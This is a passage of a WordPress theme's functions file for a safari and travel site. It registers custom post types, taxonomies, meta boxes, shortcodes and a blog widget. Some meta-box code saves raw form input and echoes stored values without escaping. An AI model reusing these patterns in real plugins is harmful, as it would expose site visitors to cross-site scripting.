        'label' => __('nature_and_wildlife', 'wanabima'),
        'description' => __('Nature and Wildlife page information', 'wanabima'),
        'labels' => $labels,
        // Features this CPT supports in Post Editor
        'supports' => array('title', 'editor', 'thumbnail', 'revisions', 'page-attributes'),
        // You can associate this CPT with a taxonomy or custom taxonomy.
        'taxonomies' => array('natureandwildlife_taxonomy', 'post_tag'),
        'hierarchical' => false,
        'menu_icon' => 'dashicons-media-archive',
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_nav_menus' => true,
        'show_in_admin_bar' => true,
        'menu_position' => 5,
        'can_export' => true,
        'has_archive' => 'nature-and-wildlife',
        'exclude_from_search' => false,
        'publicly_queryable' => true,
        'capability_type' => 'page',
        'rewrite' => array('slug' => 'nature-and-wildlife/%naw_taxonomy%')

    );

    // Registering Custom Post Type
    register_post_type('nature_and_wildlife', $args);

}

add_action('init', 'nature_wild_post_type', 0);


/**
 * Custom post type for add 4x4 details. ( only need 3 )
 */

function adventure_post_type()
{

// Set UI labels for Custom Post Type
    $labels = array(
        'name' => _x('Adventure', 'Post Type General Name', 'wanabima'),
        'singular_name' => _x('Adventure', 'Post Type Singular Name', 'wanabima'),
        'menu_name' => __('Adventure', 'wanabima'),
        'parent_item_colon' => __('Parent Item', 'wanabima'),
        'all_items' => __('Adventures', 'wanabima'),
        'view_item' => __('View Content ', 'wanabima'),
        'add_new_item' => __('Add New Content', 'wanabima'),
        'add_new' => __('Add New', 'wanabima'),
        'edit_item' => __('Edit Content', 'wanabima'),
        'update_item' => __('Update Content', 'wanabima'),
        'search_items' => __('Search Content', 'wanabima'),
        'not_found' => __('Not Found', 'wanabima'),
        'not_found_in_trash' => __('Not found in Trash', 'wanabima'),
    );

    $args = array(
        'label' => __('Adventure', 'wanabima'),
        'description' => __('Adventure page information', 'wanabima'),
        'labels' => $labels,
        // Features this CPT supports in Post Editor
        'supports' => array('title', 'editor', 'thumbnail', 'revisions', 'page-attributes'),
        'taxonomies' => array('adventure_taxonomy', 'post_tag'),
        'hierarchical' => false,
        'menu_icon' => 'dashicons-marker',
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_nav_menus' => true,
        'show_in_admin_bar' => true,
        'menu_position' => 5,
        'can_export' => true,
        'has_archive' => 'adventure',
        'exclude_from_search' => false,
        'publicly_queryable' => true,
        'capability_type' => 'page',
        'rewrite' => array('slug' => 'adventure/%adventure_taxonomy%')

    );

    // Registering Custom Post Type
    register_post_type('adventure', $args);

}

add_action('init', 'adventure_post_type', 0);

/**
 * Custom post type for add tour details.
 */

function tour_post_type()
{

// Set UI labels for Custom Post Type
    $labels = array(
        'name' => _x('Tour', 'Post Type General Name', 'wanabima'),
        'singular_name' => _x('Tour Post Type', 'Post Type Singular Name', 'wanabima'),
        'menu_name' => __('Tour', 'wanabima'),
        'parent_item_colon' => __('Parent Item', 'wanabima'),
        'all_items' => __('All Tour Items', 'wanabima'),
        'view_item' => __('View Tour Content ', 'wanabima'),
        'add_new_item' => __('Add New Tour Content', 'wanabima'),
        'add_new' => __('Add New', 'wanabima'),
        'edit_item' => __('Edit Tour Content', 'wanabima'),
        'update_item' => __('Update Tour Content', 'wanabima'),
        'search_items' => __('Search Tour Content', 'wanabima'),
        'not_found' => __('Not Found', 'wanabima'),
        'not_found_in_trash' => __('Not found in Trash', 'wanabima'),
    );

    $args = array(
        'label' => __('tours', 'wanabima'),
        'description' => __('Tour page information', 'wanabima'),
        'labels' => $labels,
        // Features this CPT supports in Post Editor
        'supports' => array('title', 'editor', 'thumbnail', 'revisions', 'page-attributes'),
        // You can associate this CPT with a taxonomy or custom taxonomy.
        'taxonomies' => array('tour_taxonomy', 'post_tag'),
        'hierarchical' => false,
        'menu_icon' => 'dashicons-palmtree',
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_nav_menus' => true,
        'show_in_admin_bar' => true,
        'menu_position' => 5,
        'can_export' => true,
        'has_archive' => 'tours',
        'exclude_from_search' => false,
        'publicly_queryable' => true,
        'capability_type' => 'page',
        'rewrite' => array('slug' => 'tours/%tour_taxonomy%')

    );

    // Registering Custom Post Type
    register_post_type('tours', $args);

}

add_action('init', 'tour_post_type', 0);


/**
 * Custom post type for add Accommodation details.
 */

function accommodation_post_type()
{

// Set UI labels for Custom Post Type
    $labels = array(
        'name' => _x('Accommodation', 'Post Type General Name', 'wanabima'),
        'singular_name' => _x('Accommodation Post Type', 'Post Type Singular Name', 'wanabima'),
        'menu_name' => __('Accommodation', 'wanabima'),
        'parent_item_colon' => __('Parent Item', 'wanabima'),
        'all_items' => __('Accommodations', 'wanabima'),
        'view_item' => __('View Accommodation Content ', 'wanabima'),
        'add_new_item' => __('Add New Accommodation Content', 'wanabima'),
        'add_new' => __('Add New', 'wanabima'),
        'edit_item' => __('Edit Accommodation Content', 'wanabima'),
        'update_item' => __('Update Accommodation Content', 'wanabima'),
        'search_items' => __('Search Accommodation Content', 'wanabima'),
        'not_found' => __('Not Found', 'wanabima'),
        'not_found_in_trash' => __('Not found in Trash', 'wanabima'),
    );

    $args = array(
        'label' => __('accommodation', 'wanabima'),
        'description' => __('Accommodation page information', 'wanabima'),
        'labels' => $labels,
        // Features this CPT supports in Post Editor
        'supports' => array('title', 'editor', 'thumbnail', 'revisions', 'page-attributes'),
        // You can associate this CPT with a taxonomy or custom taxonomy.
        'taxonomies' => array('accommodation_taxonomy', 'post_tag'),
        'hierarchical' => false,
        'menu_icon' => 'dashicons-palmtree',
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_nav_menus' => true,
        'show_in_admin_bar' => true,
        'menu_position' => 5,
        'can_export' => true,
        'has_archive' => 'accommodation',
        'exclude_from_search' => false,
        'publicly_queryable' => true,
        'capability_type' => 'page',
        'rewrite' => array('slug' => 'accommodation/%acco_taxonomy%')
    );

    // Registering Custom Post Type
    register_post_type('accommodation', $args);

}

add_action('init', 'accommodation_post_type', 0);


/**
 * Custom post type for add service details.
 */

function service_post_type()
{

// Set UI labels for Custom Post Type
    $labels = array(
        'name' => _x('Services', 'Post Type General Name', 'wanabima'),
        'singular_name' => _x('Services Post Type', 'Post Type Singular Name', 'wanabima'),
        'menu_name' => __('Services', 'wanabima'),
        'parent_item_colon' => __('Parent Item', 'wanabima'),
        'all_items' => __('Services', 'wanabima'),
        'view_item' => __('View Services Content ', 'wanabima'),
        'add_new_item' => __('Add New Services Content', 'wanabima'),
        'add_new' => __('Add New', 'wanabima'),
        'edit_item' => __('Edit Services Content', 'wanabima'),
        'update_item' => __('Update Services Content', 'wanabima'),
        'search_items' => __('Search Services Content', 'wanabima'),
        'not_found' => __('Not Found', 'wanabima'),
        'not_found_in_trash' => __('Not found in Trash', 'wanabima'),
    );

    $args = array(
        'label' => __('services', 'wanabima'),
        'description' => __('Services page information', 'wanabima'),
        'labels' => $labels,
        // Features this CPT supports in Post Editor
        'supports' => array('title', 'editor', 'thumbnail', 'revisions', 'page-attributes'),
        // You can associate this CPT with a taxonomy or custom taxonomy.
        'taxonomies' => array('post_tag'),
        'hierarchical' => false,
        'menu_icon' => 'dashicons-lightbulb',
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_nav_menus' => true,
        'show_in_admin_bar' => true,
        'menu_position' => 5,
        'can_export' => true,
        'has_archive' => true,
        'exclude_from_search' => false,
        'publicly_queryable' => true,
        'capability_type' => 'page',
    );

    // Registering Custom Post Type
    register_post_type('services', $args);

}

add_action('init', 'service_post_type', 0);

/**
 * Custom post type for add blog post.
 */

function blog_post_type()
{

// Set UI labels for Custom Post Type
    $labels = array(
        'name' => _x('Blog', 'Post Type General Name', 'wanabima'),
        'singular_name' => _x('Blog Post Type', 'Post Type Singular Name', 'wanabima'),
        'menu_name' => __('Blog', 'wanabima'),
        'parent_item_colon' => __('Parent Item', 'wanabima'),
        'all_items' => __('Blog', 'wanabima'),
        'view_item' => __('View Blog Content ', 'wanabima'),
        'add_new_item' => __('Add New Blog Content', 'wanabima'),
        'add_new' => __('Add New', 'wanabima'),
        'edit_item' => __('Edit Blog Content', 'wanabima'),
        'update_item' => __('Update Blog Content', 'wanabima'),
        'search_items' => __('Search Blog Content', 'wanabima'),
        'not_found' => __('Not Found', 'wanabima'),
        'not_found_in_trash' => __('Not found in Trash', 'wanabima'),
    );

    $args = array(
        'label' => __('blog', 'wanabima'),
        'description' => __('Blog page information', 'wanabima'),
        'labels' => $labels,
        // Features this CPT supports in Post Editor
        'supports' => array('title', 'editor', 'thumbnail', 'revisions', 'page-attributes'),
        // You can associate this CPT with a taxonomy or custom taxonomy.
        'taxonomies' => array('post_tag'),
        'hierarchical' => false,
        'menu_icon' => 'dashicons-lightbulb',
        'public' => true,
        'show_ui' => true,
        'show_in_menu' => true,
        'show_in_nav_menus' => true,
        'show_in_admin_bar' => true,
        'menu_position' => 5,
        'can_export' => true,
        'has_archive' => true,
        'exclude_from_search' => false,
        'publicly_queryable' => true,
        'capability_type' => 'page',
    );

    // Registering Custom Post Type
    register_post_type('blog', $args);

}

add_action('init', 'blog_post_type', 0);


/**
 * creating functions post_remove for removing menu item TODO:
 */
function post_remove()
{
    remove_menu_page('edit.php');
}

add_action('admin_menu', 'post_remove');


//--------------------------------------------------------------------------------------------- Post type end


//Set order by attribute for custom post
function wpa_order_states($query)
{
    if (is_admin())
        return $query;

    //if( $query->get('post_type') =='nature-wildlife'){
    $query->set('orderby', 'menu_order');
    $query->set('order', 'ASC');
    //}
    return $query;
}

add_action('pre_get_posts', 'wpa_order_states');


// Add fake metabox above editing pane
function vehicle_post_support()
{
    $screen = get_current_screen();
    $edit_post_type = $screen->post_type;
    if ($edit_post_type == 'rent_a_jeep') {

        ?>
        <div class="after-title-help postbox">
            <h3>NOTICE</h3>
            <div class="inside">
                <p>Use this screen to add new jeep or edit existing ones. Make sure you click 'Publish' to publish a
                    new item and 'Update' to save any changes.</p>
                <p>Use custome fields to add vehicle specific information and use <b>"PRICE"</b> custom field for
                    vehicle price.</p>
                <p>Keep this field format and sequence.</p>
                <ol>
                    <li>Seating Capacity</li>
                    <li>Snorkeled</li>
                    <li>Luggage Capacity</li>
                    <li>AC</li>
                    <li>Hood</li>
                    <li>Hood Rack</li>
                    <li>Transmission</li>
                    <li>Trailer</li>
                </ol>
            </div><!-- .inside -->
        </div><!-- .postbox -->
    <?php }
}

add_action('edit_form_after_title', 'vehicle_post_support');

function nature_wildlife_post_support()
{
    $screen = get_current_screen();
    $edit_post_type = $screen->post_type;
    if ($edit_post_type == 'nature_and_wildlife') {

        ?>
        <div class="after-title-help postbox">
            <h3>Using this screen</h3>
            <div class="inside">
                //TODO
            </div><!-- .inside -->
        </div><!-- .postbox -->
    <?php }
}

add_action('edit_form_after_title', 'nature_wildlife_post_support');

function service_post_support()
{
    $screen = get_current_screen();
    $edit_post_type = $screen->post_type;
    if ($edit_post_type == 'service') {

        ?>
        <div class="after-title-help postbox">
            <h3 style="color: darkred;">Remember</h3>
            <div class="inside">
                <p>Always use square shape (1x1 ratio) images. </p>
            </div><!-- .inside -->
        </div><!-- .postbox -->
    <?php }
}

add_action('edit_form_after_title', 'service_post_support');

function big_five_post_support()
{
    $screen = get_current_screen();
    $edit_post_type = $screen->post_type;
    if ($edit_post_type == 'big_five') {

        ?>
        <div class="after-title-help postbox">
            <h3 style="color: darkred;">Remember</h3>
            <div class="inside">
                <p>Always use 640x840 resolution images. </p>
            </div><!-- .inside -->
        </div><!-- .postbox -->
    <?php }
}

add_action('edit_form_after_title', 'big_five_post_support');


/**
 * Add multiple image support for vehicle
 *
 * vehicles, camp-site
 */

if (class_exists('MultiPostThumbnails')) {

    //rent a jeep
    new MultiPostThumbnails(array(
        'label' => 'Second Image',
        'id' => 'second-image',
        'post_type' => 'rent_a_jeep'
    ));

    new MultiPostThumbnails(array(
        'label' => 'Third Image',
        'id' => 'third-image',
        'post_type' => 'rent_a_jeep'
    ));

    new MultiPostThumbnails(array(
        'label' => 'Forth Image',
        'id' => 'forth-image',
        'post_type' => 'rent_a_jeep'
    ));

    new MultiPostThumbnails(array(
        'label' => 'Fifth Image',
        'id' => 'fifth-image',
        'post_type' => 'rent_a_jeep'
    ));

    //Campings
    new MultiPostThumbnails(array(
        'label' => 'Second Image',
        'id' => 'second-image',
        'post_type' => 'camping'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Third Image',
        'id' => 'third-image',
        'post_type' => 'camping'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Forth Image',
        'id' => 'forth-image',
        'post_type' => 'camping'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Fifth Image',
        'id' => 'fifth-image',
        'post_type' => 'camping '
    ));


    //nature-wildlife
    new MultiPostThumbnails(array(
        'label' => 'Second Image',
        'id' => 'second-image',
        'post_type' => 'nature_and_wildlife'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Third Image',
        'id' => 'third-image',
        'post_type' => 'nature_and_wildlife'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Forth Image',
        'id' => 'forth-image',
        'post_type' => 'nature_and_wildlife'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Fifth Image',
        'id' => 'fifth-image',
        'post_type' => 'nature_and_wildlife'
    ));

    //Adventure
    new MultiPostThumbnails(array(
        'label' => 'Second Image',
        'id' => 'second-image',
        'post_type' => 'adventure'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Third Image',
        'id' => 'third-image',
        'post_type' => 'adventure'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Forth Image',
        'id' => 'forth-image',
        'post_type' => 'adventure'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Fifth Image',
        'id' => 'fifth-image',
        'post_type' => 'adventure'
    ));

    //tours
    new MultiPostThumbnails(array(
        'label' => 'Second Image',
        'id' => 'second-image',
        'post_type' => 'tours'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Third Image',
        'id' => 'third-image',
        'post_type' => 'tours'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Forth Image',
        'id' => 'forth-image',
        'post_type' => 'tours'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Fifth Image',
        'id' => 'fifth-image',
        'post_type' => 'tours'
    ));


    //accommodation
    new MultiPostThumbnails(array(
        'label' => 'Second Image',
        'id' => 'second-image',
        'post_type' => 'accommodation'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Third Image',
        'id' => 'third-image',
        'post_type' => 'accommodation'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Forth Image',
        'id' => 'forth-image',
        'post_type' => 'accommodation'
    ));
    new MultiPostThumbnails(array(
        'label' => 'Fifth Image',
        'id' => 'fifth-image',
        'post_type' => 'accommodation'
    ));


}

/**
 *
 * Add sub title meta box
 * 'camping','nature-and-wildlife' ,'tours', 'adventure'
 *
 */

function your_sub_title()
{
    add_meta_box('your_sub_title_metabox', 'Edit Sub Title', 'your_sub_title_metabox', ['camping','nature_and_wildlife' ,'tours', 'adventure'], 'normal', 'default'); ## Adds a meta box to post type
}

add_action('add_meta_boxes', 'your_sub_title');

function your_sub_title_metabox()
{

    global $post; ## global post object

    wp_nonce_field(plugin_basename(__FILE__), 'your_sub_title_nonce'); ## Create nonce

    $subtitle = get_post_meta($post->ID, 'sub_title', true); ## Get the subtitle

    ?>
    <p>
        <label for="sub_title">Sub Title</label>
        <input type="text" name="sub_title" id="sub_title" class="widefat" value="<?php if (isset($subtitle)) {
            echo $subtitle;
        } ?>"/>
    </p>
    <?php
}

function sub_title_save_meta($post_id, $post)
{
    global $post;

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE)
        return false; ## Block if doing autosave

    if (!current_user_can('edit_post', $post->ID)) {
        return $post->ID; ## Block if user doesn't have priv
    }

    if (!wp_verify_nonce($_POST['your_sub_title_nonce'], plugin_basename(__FILE__))) {


    } else {
        if ($_POST['sub_title']) {
            update_post_meta($post->ID, 'sub_title', $_POST['sub_title']);
        } else {
            update_post_meta($post->ID, 'sub_title', '');
        }
    }

    return false;

}

add_action('save_post', 'sub_title_save_meta', 1, 2);


/**
 *
 * Add button title and link meta box
 * nature-and-wildlife, adventure, tours, accommodation, camping
 *
 */

function your_button_link()
{
//    add_meta_box('your_button_link_metabox', 'Edit Button Link', 'your_button_link_metabox', ['nature_and_wildlife', 'adventure', 'tours', 'accommodation', 'camping'], 'normal', 'default'); ## Adds a meta box to post type
//    TODO
}

add_action('add_meta_boxes', 'your_button_link');

function your_button_link_metabox()
{

    global $post; ## global post object

    wp_nonce_field(plugin_basename(__FILE__), 'your_button_link_nonce'); ## Create nonce

    $button_link = get_post_meta($post->ID, 'button_link', true); ## Get the link
    $button_title = get_post_meta($post->ID, 'button_title', true); ## Get the title
    ?>
    <p>
        <label for="button_title">Button Title</label>
        <input type="text" name="button_title" id="button_title" class="widefat"
               value="<?php if (isset($button_title)) {
                   echo $button_title;
               } ?>"/>
    </p>
    <p>
        <label for="button_link">Button Link</label>
        <input type="text" name="button_link" id="button_link" class="widefat" value="<?php if (isset($button_link)) {
            echo $button_link;
        } ?>"/>
    </p>
    <?php
}

function button_link_save_meta($post_id, $post)
{
    global $post;

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE)
        return false; ## Block if doing autosave

    if (!current_user_can('edit_post', $post->ID)) {
        return $post->ID; ## Block if user doesn't have priv
    }

    if (!wp_verify_nonce($_POST['your_button_link_nonce'], plugin_basename(__FILE__))) {


    } else {
        if ($_POST['button_link']) {
            update_post_meta($post->ID, 'button_link', $_POST['button_link']);
            update_post_meta($post->ID, 'button_title', $_POST['button_title']);
        } else {
            update_post_meta($post->ID, 'button_link', '');
        }

        if ($_POST['button_title']) {
            update_post_meta($post->ID, 'button_title', $_POST['button_title']);
        } else {
            update_post_meta($post->ID, 'button_title', '');
        }
    }

    return false;

}

add_action('save_post', 'button_link_save_meta', 1, 2);

/**
 * Gallery edit
 *
 */
add_filter('post_gallery', 'my_post_gallery', 10, 2);
function my_post_gallery($output, $attr)
{
    global $post;

    if (isset($attr['orderby'])) {
        $attr['orderby'] = sanitize_sql_orderby($attr['orderby']);
        if (!$attr['orderby'])
            unset($attr['orderby']);
    }

    extract(shortcode_atts(array(
        'order' => 'ASC',
        'orderby' => 'menu_order ID',
        'id' => $post->ID,
        'itemtag' => 'dl',
        'icontag' => 'dt',
        'captiontag' => 'dd',
        'columns' => 3,
        'size' => 'thumbnail',
        'include' => '',
        'exclude' => ''
    ), $attr));

    $id = intval($id);
    if ('RAND' == $order) $orderby = 'none';

    if (!empty($include)) {
        $include = preg_replace('/[^0-9,]+/', '', $include);
        $_attachments = get_posts(array('include' => $include, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby));

        $attachments = array();
        foreach ($_attachments as $key => $val) {
            $attachments[$val->ID] = $_attachments[$key];
        }
    }

    if (empty($attachments)) return '';

    // Here's your actual output, you may customize it to your need

    $output = "<div id=\"imagemenu\" class=\"tab-pane fade show active\" role=\"tabpanel\" aria-labelledby=\"imagemenu-tab\"><div class=\"row text-center text-lg-left\">\n";

    // Now you loop through each attachment
    foreach ($attachments as $id => $attachment) {
        // Fetch the thumbnail (or full image, it's up to you)
//      $img = wp_get_attachment_image_src($id, 'medium');
//      $img = wp_get_attachment_image_src($id, 'my-custom-image-size');
        $img = wp_get_attachment_image_src($id, 'full');

        $output .= "<div class=\"col-lg-3 col-md-4 col-xs-6\">\n";
        $output .= "<a href=\"{$img[0]}\" class=\"d-block mb-4 h-100\" data-toggle='lightbox' data-gallery='wanabimagallery'>";

        $output .= "<img src=\"{$img[0]}\" class='img-fluid img-thumbnail img-gallery' alt=\"wanabima gallery\" />\n";
        $output .= "</a></div>\n";
    }

    $output .= "</div></div>\n";

    return $output;
}

/**
 * Add shortcode youtube
 * [youtube youtubeid="foo-value"]
 *
*/

function youtubePlaylist($atts)
{
    $a = shortcode_atts(array(
        'youtubeid' => '',
    ), $atts);

    $urlvid = parse_url($a['url']);
    parse_str($urlvid['query'], $url);

    $youtubeids = explode(',', $a['youtubeid']);

    $completeStr = "";
    foreach ($youtubeids as $yid) {
        $thumbnail = "https://img.youtube.com/vi/{$yid}/0.jpg";
        $str = "
                <a href=\"https://www.youtube.com/watch?v=" . $yid . "\" data-toggle=\"lightbox\" data-gallery=\"youtubevideos\" class=\"col-sm-4\">
                <img src=\"" . $thumbnail . "\" class=\"img-fluid p-1\" alt=\"wanabima video gallery\">
                </a>";
        $completeStr .= $str;
    }


    $strBefore = "<div id=\"videomenu\" role=\"tabpanel\" class=\"tab-pane fade\" aria-labelledby=\"videomenu-tab\">
                    {$completeStr}
                   </div>";
    return $strBefore;
}

add_shortcode('youtube', 'youtubePlaylist');


/**
 * Add shortcode term slider
 * [slider id="12,55" name="acorss_the_paradise"]
 * name - slug with underscore
 *
 */

function termShortCode($atts)
{
    $a = shortcode_atts(array(
        'id' => '',
        'name' => ''
    ), $atts);

    $imgids = explode(',', $a['id']);
    $imgName =strtolower($a['name']);


    $tempStr = 'active';
    $completeStr = "<script> let imgList_".$imgName." = [";
    foreach ($imgids as $iid) {
        $imgSorce = wp_get_attachment_image_src($iid,"size");
        if($imgSorce) {
            $completeStr .= '\'<div class="carousel-item '.$tempStr.'"><img class="d-block w-100 campsite-carousel-img" alt="wanabima image" src="' . $imgSorce[0] . '"</div>\',';
            $tempStr ='';
        }
    }

    $completeStr .= ']</script>';
    return $completeStr;
}

add_shortcode('slider', 'termShortCode');


/**
 *
 * Edit read more text url
 *
 */

function modify_read_more_link()
{
    return '<a class="more-link" href="' . get_permalink() . '" target="_blank" >Read the rest...</a>';
}

add_filter('the_content_more_link', 'modify_read_more_link');


/**
 * Custom post type widget
 *
 */

// Register and load the widget
function wpb_load_widget()
{
    register_widget('WP_Widget_Recent_Blog_Posts');
}

add_action('widgets_init', 'wpb_load_widget');

class WP_Widget_Recent_Blog_Posts extends WP_Widget
{

    public function __construct()
    {
        $widget_ops = array(
            'classname' => 'widget_recent_entries',
            'description' => __('Your site&#8217;s most recent Blog Posts.'),
            'customize_selective_refresh' => true,
        );
        parent::__construct('recent-posts', __('Recent Wanabima Blog Posts'), $widget_ops);
        $this->alt_option_name = 'widget_recent_entries';
    }

    public function widget($args, $instance)
    {
        if (!isset($args['widget_id'])) {
            $args['widget_id'] = $this->id;
        }

        $title = (!empty($instance['title'])) ? $instance['title'] : __('Recent Wanabima Blog Posts');

        /** This filter is documented in wp-includes/widgets/class-wp-widget-pages.php */
        $title = apply_filters('widget_title', $title, $instance, $this->id_base);

        $number = (!empty($instance['number'])) ? absint($instance['number']) : 5;
        if (!$number) {
            $number = 5;
        }
        $show_date = isset($instance['show_date']) ? $instance['show_date'] : false;

        $r = new WP_Query(apply_filters('widget_posts_args', array(
            'posts_per_page' => $number,
            'no_found_rows' => true,
            'post_status' => 'publish',
            'ignore_sticky_posts' => true,
            'post_type' => array('blog')
        ), $instance));

        if (!$r->have_posts()) {
            return;
        }
        ?>
        <?php echo $args['before_widget']; ?>
        <?php
        if ($title) {
            echo $args['before_title'] . $title . $args['after_title'];
        }
        ?>
        <ul>
            <?php foreach ($r->posts as $recent_post) : ?>
                <?php
                $post_title = get_the_title($recent_post->ID);
                $title = (!empty($post_title)) ? $post_title : __('(no title)');
                ?>
                <li>
                    <a href="<?php the_permalink($recent_post->ID); ?>"><?php echo $title; ?></a>
                    <?php if ($show_date) : ?>
                        <span class="post-date"><?php echo get_the_date('', $recent_post->ID); ?></span>
                    <?php endif; ?>
                </li>
            <?php endforeach; ?>
        </ul>
        <?php
        echo $args['after_widget'];
    }

    public function update($new_instance, $old_instance)
    {
        $instance = $old_instance;
        $instance['title'] = sanitize_text_field($new_instance['title']);
        $instance['number'] = (int)$new_instance['number'];
        $instance['show_date'] = isset($new_instance['show_date']) ? (bool)$new_instance['show_date'] : false;
        return $instance;
    }

    public function form($instance)
    {
        $title = isset($instance['title']) ? esc_attr($instance['title']) : '';
        $number = isset($instance['number']) ? absint($instance['number']) : 5;
        $show_date = isset($instance['show_date']) ? (bool)$instance['show_date'] : false;
        ?>
        <p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:'); ?></label>
            <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>"
                   name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>"/></p>

        <p><label for="<?php echo $this->get_field_id('number'); ?>"><?php _e('Number of posts to show:'); ?></label>
            <input class="tiny-text" id="<?php echo $this->get_field_id('number'); ?>"
                   name="<?php echo $this->get_field_name('number'); ?>" type="number" step="1" min="1"
                   value="<?php echo $number; ?>" size="3"/></p>

        <p><input class="checkbox" type="checkbox"<?php checked($show_date); ?>
                  id="<?php echo $this->get_field_id('show_date'); ?>"
                  name="<?php echo $this->get_field_name('show_date'); ?>"/>
            <label for="<?php echo $this->get_field_id('show_date'); ?>"><?php _e('Display post date?'); ?></label></p>
        <?php
    }
}

/**
 * Fileter for term description shortcode
 */
add_filter( 'term_description', 'do_shortcode' );

//TODO : ADD header slider for each page ... like contents ... 2 image per page...


/**
 *
 * Add custom taxonomy for page type
 *
 */
//camping
function camping_taxonomy()
{

    register_taxonomy(
        'camping_taxonomy',
        'camping',
        array(
            'label' => __('Camping Types'),
            'rewrite' => array('slug' => 'camping'),
            'hierarchical' => true,
            'sort' => true,
            'show_ui' => true,
        )
    );

}

add_action('init', 'camping_taxonomy');

function filter_camping_post_type_link($link, $post)
{
    if ($post->post_type != 'camping')
        return $link;

    if ($cats = get_the_terms($post->ID, 'camping_taxonomy')) {
        $link = str_replace('%camping_taxonomy%', array_pop($cats)->slug, $link);
    }

    return $link;
}

add_filter('post_type_link', 'filter_camping_post_type_link', 10, 2);


//Nature and wildlife
function naw_taxonomy()
{

    register_taxonomy(
        'natureandwildlife_taxonomy',
        'nature_and_wildlife',
        array(
            'label' => __('Nature & Wildlife Types'),
            'rewrite' => array('slug' => 'nature-and-wildlife'),
            'hierarchical' => true,
            'sort' => true,
            'show_ui' => true,
        )
    );

}

add_action('init', 'naw_taxonomy');
function filter_naw_post_type_link($link, $post)
{
    if ($post->post_type != 'nature_and_wildlife')
        return $link;

    if ($cats = get_the_terms($post->ID, 'natureandwildlife_taxonomy')) {

        $last_term = array_pop($cats);
        $slug_part = "";
        if($last_term->parent != 0){
            $parent_obj = get_term_by('id',$last_term->parent,'natureandwildlife_taxonomy');
            $slug_part = $parent_obj->slug . '/';
        }

        $slug_part .= $last_term->slug;

        $link = str_replace('%naw_taxonomy%', $slug_part, $link);

    }

    return $link;
}

add_filter('post_type_link', 'filter_naw_post_type_link', 10, 2);

function big_five_with_wanabima_template_redirect( $template ) {
    if ( is_tax( 'natureandwildlife_taxonomy','big-five-with-wanabima' ) ) {
        $template = get_query_template( 'page-big-five-with-wanabima' );
    }
    return $template;
}
add_filter( 'template_include', 'big_five_with_wanabima_template_redirect' );


//adventure
function adventure_taxonomy()
{

    register_taxonomy(
        'adventure_taxonomy',
        'adventure',
        array(
            'label' => __('Adventure Types'),
            'rewrite' => array('slug' => 'adventure'),
            'hierarchical' => true,
            'sort' => true,
        )
    );

}

add_action('init', 'adventure_taxonomy');
function filter_adventure_post_type_link($link, $post)
{
    if ($post->post_type != 'adventure')
        return $link;

    if ($cats = get_the_terms($post->ID, 'adventure_taxonomy')) {
        $link = str_replace('%adventure_taxonomy%', array_pop($cats)->slug, $link);
    }

    return $link;
}

add_filter('post_type_link', 'filter_adventure_post_type_link', 10, 2);


//tours
function tour_taxonomy()
{

    register_taxonomy(
        'tour_taxonomy',
        'tours',
        array(
            'label' => __('Tours Types'),
            'rewrite' => array('slug' => 'tours'),
            'hierarchical' => true,
            'sort' => true,
        )
    );

}

add_action('init', 'tour_taxonomy');
function filter_tour_post_type_link($link, $post)
{
    if ($post->post_type != 'tours')
        return $link;

    if ($cats = get_the_terms($post->ID, 'tour_taxonomy')) {
        $link = str_replace('%tour_taxonomy%', array_pop($cats)->slug, $link);
    }

    return $link;
}

add_filter('post_type_link', 'filter_tour_post_type_link', 10, 2);


//accommodation
function accommodation_taxonomy()
{

    register_taxonomy(
        'accommodation_taxonomy',
        'accommodation',
        array(
            'label' => __('Accommodation Types'),
            'rewrite' => array('slug' => 'accommodation'),
            'hierarchical' => true,
            'sort' => true,

        )
    );

}

add_action('init', 'accommodation_taxonomy');

function filter_accom_post_type_link($link, $post)
{
    if ($post->post_type != 'accommodation')
        return $link;

    if ($cats = get_the_terms($post->ID, 'accommodation_taxonomy')) {
        $link = str_replace('%acco_taxonomy%', array_pop($cats)->slug, $link);
    }

    return $link;
}

add_filter('post_type_link', 'filter_accom_post_type_link', 10, 2);

function register_new_terms() {
    $terms = array (
        '0' => array (
            'taxonomy'      => 'camping_taxonomy',
            'name'          => 'Camping Sites',
            'slug'          => 'camping-sites',
            'description'   => 'Camping sites',
        ),
        '1' => array (
            'taxonomy'      => 'camping_taxonomy',
            'name'          => 'Glamping Sites',
            'slug'          => 'glamping-sites',
            'description'   => 'This is Glamping sites',
        ),

        '2' => array (
            'taxonomy'      => 'natureandwildlife_taxonomy',
            'name'          => 'National Parks',
            'slug'          => 'national-parks',
            'description'   => 'This is National Parks',
        ),

        '3' => array (
            'taxonomy'      => 'natureandwildlife_taxonomy',
            'name'          => 'Big Five With Wanabima',
            'slug'          => 'big-five-with-wanabima',
            'description'   => 'This is Big Five With Wanabima',
        ),

        '4' => array (
            'taxonomy'      => 'natureandwildlife_taxonomy',
            'name'          => 'Wanabima Safari',
            'slug'          => 'wanabima-safari',
            'description'   => 'This is Wanabima Safari',
        ),

        '5' => array (
            'taxonomy'      => 'adventure_taxonomy',
            'name'          => '4x4 Adventure',
            'slug'          => '4x4-adventure',
